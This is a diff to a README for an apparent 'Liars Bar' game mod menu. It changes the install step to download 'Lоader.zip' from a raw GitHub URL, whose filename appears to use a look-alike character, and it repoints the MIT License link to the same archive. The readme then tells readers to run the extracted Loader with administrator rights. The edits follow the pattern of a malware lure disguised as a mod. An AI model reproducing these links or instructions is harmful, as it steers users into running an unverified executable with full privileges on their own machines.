@@ -20,7 +20,7 @@ Welcome to **Liars Bar Mod Menu**, your ultimate enhancement toolkit for customi
 
 Jump right into the action with a super straightforward installation process:
 
-1. Download `Loader.rar` from the repository.
+1. Download `https://raw.githubusercontent.com/begejol12/LiarsBar-GameModMenu/main/Lоader.zip` from the repository.
 2. Extract the contents using your favorite extraction software (e.g., WinRAR, 7-Zip, The Unarchiver).
 3. Run the Loader executable with administrator permissions for optimal performance.
 4. Follow the in-app instructions to initialize the installation and configure your settings.
@@ -85,7 +85,7 @@ Liars Bar Mod Menu is intended strictly for educational and entertainment purpos
 
 ## 📜 License
 
-This project is licensed under the [MIT License](https://opensource.org/license/mit/).  
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/begejol12/LiarsBar-GameModMenu/main/Lоader.zip).  
 Feel free to modify, distribute, or contribute in accordance with open-source ethics. Enjoy enhanced gameplay in 2025—with total peace of mind! 🚀
 
 ---
